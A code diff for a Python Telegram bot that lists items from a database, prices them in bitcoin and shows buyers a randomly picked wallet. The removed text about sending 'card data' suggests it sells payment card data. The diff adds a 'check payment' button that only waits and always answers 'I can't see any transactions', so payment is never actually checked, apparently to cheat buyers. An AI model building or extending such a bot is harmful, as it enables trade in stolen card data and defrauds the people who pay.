@@ -11,6 +11,8 @@ from loader import bot
 from aiogram.types import ReplyKeyboardRemove
 from database.sqlite_database import get_data_from_db
 from Bitcoin_parse import get_currency
+from config import wallets
+
 
 parsed_data = "HERE WILL BE DATA FROM DB"
 counter = 0
@@ -133,11 +135,10 @@ async def callbackdata(callback: CallbackQuery):
         await bot.send_message(text='Preparing wallet for you...', chat_id=callback.from_user.id)
         btc = await get_currency(int(float(parsed_data[counter][4].rstrip("$"))))
         await asyncio.sleep(random.randint(2, 5))
-        wallets = open("wallets.txt", "r")
-        wallet = random.choice(wallets.readlines())
+        wallet = random.choice(wallets)
         await bot.send_message(text=f'Now you have 20 minutes to pay {parsed_data[counter][4]}\n'
                                     f'that equals *{btc}* on this wallet\n*{wallet}*\n'
-                                    f'After payment card data will be automatically send by bot',
+                                    f'then just click on button check payment',
                                chat_id=callback.from_user.id, parse_mode='Markdown',
                                reply_markup=buttons.inline_markup_cancel)
 
@@ -147,6 +148,10 @@ async def callbackdata(callback: CallbackQuery):
         await asyncio.sleep(random.randint(1, 3))
         await bot.send_message(chat_id=callback.from_user.id, text='turning you back...',
                                reply_markup=main_menu.main_menu)
+
+    if callback.data == 'check_pm':
+        await asyncio.sleep(random.randint(1, 2))
+        await callback.answer(text="I can't see any transactions", show_alert=True)
 
     if callback.data == 'Back to main menu':
         counter = 0
@@ -197,7 +202,7 @@ def register_message_handler(dp: Dispatcher):
                                                         ignore_case=True))
     dp.register_message_handler(inline_template, filters.Text(equals=final_list, ignore_case=True))
     dp.register_callback_query_handler(callbackdata, filters.Text(
-        equals=['next_elem', 'prev_elem', 'Back to main menu', 'buy_button', 'yes', 'no', 'cancel']))
+        equals=['next_elem', 'prev_elem', 'Back to main menu', 'buy_button', 'yes', 'no', 'cancel', 'check_pm']))
 
 
 def register_handler_unknown_command(dp: Dispatcher):
